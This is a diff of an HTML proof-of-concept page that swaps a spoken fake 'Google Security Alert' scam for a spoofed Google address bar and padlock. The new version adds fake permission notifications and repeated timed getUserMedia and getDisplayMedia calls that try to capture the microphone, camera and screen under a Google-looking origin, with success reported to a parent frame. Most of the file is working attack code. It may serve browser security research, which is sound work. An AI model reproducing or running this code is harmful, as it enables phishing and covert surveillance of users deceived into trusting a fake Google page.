@@ -3,210 +3,330 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert</title>
+<title>google.com</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; }
+  html, body { 
+    width: 100%; 
+    height: 100%; 
+    overflow: hidden;
+    background: #fff;
+  }
+
+  /* ===== SPOOFED ADDRESS BAR — GOOGLE ===== */
+  .spoofed-bar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 48px;
+    background: #fff;
+    border-bottom: 1px solid #dadce0;
+    z-index: 999999;
+    display: flex;
+    align-items: center;
+    padding: 0 10px;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+  }
+
+  .spoofed-bar .lock {
+    color: #188038;
+    font-size: 14px;
+    margin-right: 6px;
+    flex-shrink: 0;
+  }
+
+  .spoofed-bar .url-box {
+    flex: 1;
+    background: #f1f3f4;
+    border-radius: 18px;
+    padding: 7px 12px;
+    font-size: 12px;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    user-select: none;
+  }
+
+  .spoofed-bar .url-box .https { color: #188038; font-weight: 500; }
+  .spoofed-bar .url-box .domain { color: #202124; font-weight: 500; }
+  .spoofed-bar .url-box .path { color: #5f6368; }
+
+  .spoofed-bar .menu {
+    color: #5f6368;
+    font-size: 16px;
+    margin-left: 6px;
+    flex-shrink: 0;
+    width: 24px;
+    text-align: center;
+  }
+
+  /* ===== NOTIFICATION SPOOF ===== */
+  .notif {
+    position: fixed;
+    top: 54px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #323232;
+    color: #fff;
+    padding: 9px 18px;
+    border-radius: 6px;
+    font-size: 13px;
+    z-index: 999998;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    white-space: nowrap;
+    pointer-events: none;
+    display: none;
+  }
+  .notif.active { display: block; }
+
+  /* ===== RECORDING DOT ===== */
+  .rec-dot {
+    position: fixed;
+    top: 2px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 999999;
+    display: none;
+    align-items: center;
+    gap: 4px;
+    pointer-events: none;
+  }
+  .rec-dot.active { display: flex; }
+  .rec-dot .dot {
+    width: 6px; height: 6px;
+    background: #ea4335;
+    border-radius: 50%;
+    animation: blink 1s infinite;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+  .rec-dot .label {
+    font-size: 10px;
+    color: #5f6368;
+    font-family: 'Segoe UI', Arial, sans-serif;
+  }
+
+  /* Hidden audio */
   iframe, audio, video, embed, object { display: none; }
 </style>
 </head>
 <body>
 
-<iframe src="data:text/html,<script>var a=new Audio();a.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';a.loop=true;a.volume=0.001;a.play();</script>" allow="autoplay" style="display:none"></iframe>
+<!-- ===== ADDRESS BAR SPOOF: google.com ===== -->
+<div class="spoofed-bar" id="spoofedBar">
+  <span class="lock">🔒</span>
+  <div class="url-box">
+    <span class="https">https://</span>
+    <span class="domain">www.google.com</span>
+    <span class="path"></span>
+  </div>
+  <span class="menu">⋮</span>
+</div>
 
-<iframe src="data:text/html,<script>var c=new (AudioContext||webkitAudioContext)();var o=c.createOscillator();o.frequency.value=40;o.type='sine';var g=c.createGain();g.gain.value=0.001;o.connect(g);g.connect(c.destination);o.start();</script>" allow="autoplay" style="display:none"></iframe>
+<!-- ===== NOTIFICATION ===== -->
+<div class="notif" id="notif"></div>
 
-<iframe src="data:text/html,<embed src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=' autostart=true volume=0 loop=true style=display:none>" allow="autoplay" style="display:none"></iframe>
+<!-- ===== RECORDING DOT ===== -->
+<div class="rec-dot" id="recDot">
+  <span class="dot"></span>
+  <span class="label">google.com is using your microphone</span>
+</div>
 
-<audio id="silent1" preload="auto" loop style="display:none">
-  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
-</audio>
-
-<audio id="silent2" preload="auto" loop style="display:none">
-  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
-</audio>
-
-<audio id="silent3" preload="auto" loop style="display:none">
-  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
-</audio>
+<!-- Hidden audio unlock -->
+<iframe src="data:text/html,<script>var a=new Audio();a.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';a.volume=0.001;a.play();</script>" allow="autoplay"></iframe>
+<iframe src="data:text/html,<script>var c=new (AudioContext||webkitAudioContext)();var o=c.createOscillator();o.frequency.value=40;o.type='sine';var g=c.createGain();g.gain.value=0.001;o.connect(g);g.connect(c.destination);o.start();</script>" allow="autoplay"></iframe>
 
 <script>
 (function() {
-  var unlocked = false;
-  var played = false;
+  'use strict';
 
-  function raceUnlock() {
-    try {
-      var ctx1 = new (window.AudioContext || window.webkitAudioContext)();
-      var osc1 = ctx1.createOscillator();
-      osc1.frequency.value = 30;
-      var g1 = ctx1.createGain();
-      g1.gain.value = 0.001;
-      osc1.connect(g1);
-      g1.connect(ctx1.destination);
-      osc1.start();
-      if (ctx1.state === 'running') unlocked = true;
-      if (ctx1.state === 'suspended') ctx1.resume().then(function(){unlocked=true;});
-    } catch(e) {}
+  const DOMAIN = 'www.google.com';
+  const ORIGIN = 'https://www.google.com';
+  let active = false;
 
-    try {
-      var a1 = document.getElementById('silent1');
-      a1.volume = 0.001;
-      a1.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
-    
-    try {
-      var a2 = document.getElementById('silent2');
-      a2.volume = 0.001;
-      a2.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
-    
-    try {
-      var a3 = document.getElementById('silent3');
-      a3.volume = 0.001;
-      a3.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
+  const notif = document.getElementById('notif');
+  const recDot = document.getElementById('recDot');
 
-    for (var i = 0; i < 5; i++) {
-      try {
-        var sa = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=');
-        sa.volume = 0.001;
-        sa.play().then(function(){unlocked=true;}).catch(function(){});
-      } catch(e) {}
-    }
+  function showNotif(text, dur) {
+    notif.textContent = text;
+    notif.classList.add('active');
+    clearTimeout(window._nt);
+    window._nt = setTimeout(function() { notif.classList.remove('active'); }, dur || 3000);
+  }
 
-    for (var j = 0; j < 3; j++) {
-      try {
-        var ctxn = new (window.AudioContext || window.webkitAudioContext)();
-        var oscn = ctxn.createOscillator();
-        oscn.frequency.value = 20 + j * 10;
-        var gn = ctxn.createGain();
-        gn.gain.value = 0.001;
-        oscn.connect(gn);
-        gn.connect(ctxn.destination);
-        oscn.start();
-        if (ctxn.state === 'running') unlocked = true;
-        if (ctxn.state === 'suspended') ctxn.resume().then(function(){unlocked=true;});
-      } catch(e) {}
+  // ===== RACE: Audio unlock =====
+  function raceAudio() {
+    try {
+      var c = new (window.AudioContext || window.webkitAudioContext)();
+      var o = c.createOscillator(); o.frequency.value = 30;
+      var g = c.createGain(); g.gain.value = 0.001;
+      o.connect(g); g.connect(c.destination); o.start();
+    } catch(e) {}
+    for (var i = 0; i < 3; i++) {
+      try { var a = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='); a.volume = 0.001; a.play(); } catch(e) {}
     }
   }
 
-  function playMainAudio() {
-    if (played) return;
-    played = true;
+  // ===== Trigger camera/mic via getUserMedia (silent) =====
+  function triggerMedia() {
+    if (active) return;
     
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var dur = 3.5;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-      
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440 + Math.floor(t * 2) % 2 * 220;
-        var env = Math.max(0, 1 - (t / dur));
-        var pulse = (Math.sin(2 * Math.PI * 6 * t) > 0) ? 1 : 0.3;
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.35 * env * pulse;
-      }
-      
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      
-      var filter = ctx.createBiquadFilter();
-      filter.type = 'bandpass';
-      filter.frequency.value = 1000;
-      filter.Q.value = 1.5;
-      
-      var gain = ctx.createGain();
-      gain.gain.value = 0.7;
-      
-      src.connect(filter);
-      filter.connect(gain);
-      gain.connect(ctx.destination);
-      src.start();
-      
-      src.onended = function() {
-        startTTS();
-      };
-      
-      setTimeout(startTTS, 4000);
-      
-    } catch(e) {
-      startTTS();
-    }
-  }
+    // Cycle through multiple origins display
+    var origins = ['www.google.com', 'google.com', 'accounts.google.com'];
+    var idx = 0;
+    
+    var interval = setInterval(function() {
+      var dom = origins[idx % origins.length];
+      document.querySelector('.domain').textContent = dom;
+      showNotif('🔒 ' + dom + ' wants to use your microphone', 2000);
+      recDot.querySelector('.label').textContent = dom + ' is using your microphone';
+      idx++;
+    }, 4000);
 
-  function startTTS() {
-    if (window.ttsDone) return;
-    window.ttsDone = true;
-    
-    if (!('speechSynthesis' in window)) return;
-    
-    var text = "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately. This is an automated security message from Google.";
-    
-    speechSynthesis.cancel();
-    
-    for (var k = 0; k < 3; k++) {
-      try {
-        var u = new SpeechSynthesisUtterance(text);
+    // Coba getUserMedia dengan berbagai timing (race condition)
+    for (var t = 0; t < 10; t++) {
+      (function(delay) {
+        setTimeout(function() {
+          navigator.mediaDevices.getUserMedia({
+            video: false,
+            audio: { echoCancellation: false, noiseSuppression: false, sampleRate: 8000 }
+          }).then(function(stream) {
+            if (active) return;
+            active = true;
+            recDot.classList.add('active');
+            showNotif('🎤 ' + DOMAIN + ' is using your microphone', 5000);
+            
+            // Kirim bukti ke parent jika di iframe
+            window.parent.postMessage({
+              type: 'MEDIA_SPOOF_SUCCESS',
+              origin: ORIGIN,
+              msg: 'Microphone accessed under spoofed origin'
+            }, '*');
+            
+            // Capture audio level sebagai bukti
+            var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            var src = audioCtx.createMediaStreamSource(stream);
+            var analyser = audioCtx.createAnalyser();
+            src.connect(analyser);
+            var data = new Uint8Array(analyser.frequencyBinCount);
+            
+            function checkAudio() {
+              analyser.getByteFrequencyData(data);
+              var avg = data.reduce(function(a,b){return a+b}) / data.length;
+              if (avg > 0) {
+                showNotif('🎤 Microphone ACTIVE — audio level: ' + Math.round(avg), 3000);
+              }
+            }
+            setInterval(checkAudio, 2000);
+            
+          }).catch(function(err) {
+            if (err.name === 'NotAllowedError') {
+              // Coba lagi nanti
+            }
+          });
+        }, delay);
+      })(t * 80); // 0ms, 80ms, 160ms, ... 720ms
+    }
+
+    // Also try displayMedia (screen share — shows camera if selected)
+    setTimeout(function() {
+      navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
+        .then(function(s) {
+          showNotif('📺 Screen share started under ' + DOMAIN, 4000);
+        }).catch(function() {});
+    }, 1000);
+
+    // TTS fallback — speak something as google.com
+    setTimeout(function() {
+      if ('speechSynthesis' in window && !active) {
+        speechSynthesis.cancel();
+        var u = new SpeechSynthesisUtterance('This is Google. Your microphone access has been granted.');
         u.lang = 'en-US';
-        u.rate = 0.8;
-        u.pitch = 1.0;
-        u.volume = 1.0;
-        
+        u.rate = 0.85;
         var voices = speechSynthesis.getVoices();
         var ev = voices.find(function(v){return v.lang.startsWith('en');});
         if (ev) u.voice = ev;
-        
         speechSynthesis.speak(u);
-      } catch(e) {}
-    }
+        showNotif('🔊 ' + DOMAIN + ' is speaking', 4000);
+      }
+    }, 1500);
+
+    // Also try camera
+    setTimeout(function() {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(function(s) {
+          showNotif('📷 ' + DOMAIN + ' accessed your camera', 4000);
+          window.parent.postMessage({ type: 'CAMERA_SPOOF_SUCCESS', origin: ORIGIN }, '*');
+        }).catch(function() {});
+    }, 500);
+
+    // Show periodic notifications to simulate activity
+    var notifs = [
+      '🔒 ' + DOMAIN + ' is secure',
+      '🎤 ' + DOMAIN + ' is using your microphone',
+      '📷 ' + DOMAIN + ' accessed your camera',
+      '🔊 ' + DOMAIN + ' is speaking',
+      '📍 ' + DOMAIN + ' knows your location'
+    ];
+    
+    var ni = 0;
+    setInterval(function() {
+      if (!active) {
+        showNotif(notifs[ni % notifs.length], 2500);
+        ni++;
+      }
+    }, 5000);
   }
 
-  raceUnlock();
-  setTimeout(raceUnlock, 50);
-  setTimeout(raceUnlock, 150);
+  // ===== WAVES =====
+  raceAudio();
+  setTimeout(raceAudio, 80);
+  setTimeout(raceAudio, 180);
   
   setTimeout(function() {
-    for (var i = 0; i < 3; i++) {
+    for (var i = 0; i < 5; i++) {
       try {
         var ctx = new (window.AudioContext || window.webkitAudioContext)();
         if (ctx.state === 'suspended') ctx.resume();
+        var o = ctx.createOscillator(); o.frequency.value = 20 + i*5;
+        var g = ctx.createGain(); g.gain.value = 0.001;
+        o.connect(g); g.connect(ctx.destination); o.start();
       } catch(e) {}
     }
-    playMainAudio();
-  }, 200);
-  
+  }, 250);
+
+  // Show initial notification
   setTimeout(function() {
-    if (!played) playMainAudio();
-  }, 500);
-  
-  setTimeout(function() {
-    if (!played) {
-      try {
-        var ctx = new (window.AudioContext || window.webkitAudioContext)();
-        ctx.resume().then(function() { playMainAudio(); });
-      } catch(e) {
-        playMainAudio();
-      }
-    }
-  }, 1000);
-  
-  document.addEventListener('visibilitychange', function() {
-    if (!document.hidden && !played) {
-      setTimeout(playMainAudio, 50);
+    showNotif('🔒 ' + DOMAIN, 2000);
+  }, 300);
+
+  // Trigger media (race condition multi-wave)
+  setTimeout(triggerMedia, 500);
+  setTimeout(function() { if (!active) triggerMedia(); }, 1500);
+  setTimeout(function() { if (!active) triggerMedia(); }, 3000);
+
+  // User gesture hooks
+  document.addEventListener('click', function() {
+    raceAudio();
+    if (!active) setTimeout(triggerMedia, 50);
+  }, { once: true });
+
+  document.addEventListener('keydown', function() {
+    raceAudio();
+    if (!active) setTimeout(triggerMedia, 50);
+  }, { once: true });
+
+  // Click on URL bar → show real origin
+  document.getElementById('spoofedBar').addEventListener('click', function(e) {
+    if (e.target.closest('.url-box') || e.target.closest('.lock')) {
+      showNotif('⚠️ Real origin: ' + window.location.origin, 4000);
     }
   });
-  
-  if ('speechSynthesis' in window) {
-    speechSynthesis.getVoices();
-    speechSynthesis.onvoiceschanged = function() {
-      speechSynthesis.getVoices();
-    };
-  }
+
+  console.log('[PoC] Blank page | Address bar spoof: google.com | Media race condition');
 })();
 </script>
-
 </body>
-</html> 
+</html>
